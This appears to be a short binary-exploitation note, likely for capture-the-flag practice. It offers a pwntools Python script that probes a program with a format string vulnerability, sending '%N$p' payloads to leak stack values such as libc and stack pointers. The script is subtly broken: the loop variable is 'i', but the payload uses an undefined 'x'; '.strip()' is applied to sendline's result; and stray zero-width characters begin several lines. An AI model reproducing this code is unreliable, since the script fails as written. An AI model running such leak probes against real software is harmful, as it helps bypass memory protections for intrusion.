# Fuzzer

Here is a fuzzer that I have written which can be used when a format string vulnerability is present. This will leak values off of the stack, and you can know which value they are. You can then check whether they're `libc` pointers or `stack` pointers etc.

```python
from pwn import *

​binary = "program"
fuzzer_range = 100

​e = ELF(f"./{binary}")
p = process(e.path)

​for i in range(0, fuzzer_range):
    p.sendline(f"%{x}$p").strip()
    p.clean()
    try:
        leak = int(p.recvline(), 16)
        print(f"%{x}$p : {hex(leak)}")
    except:
        pass
```

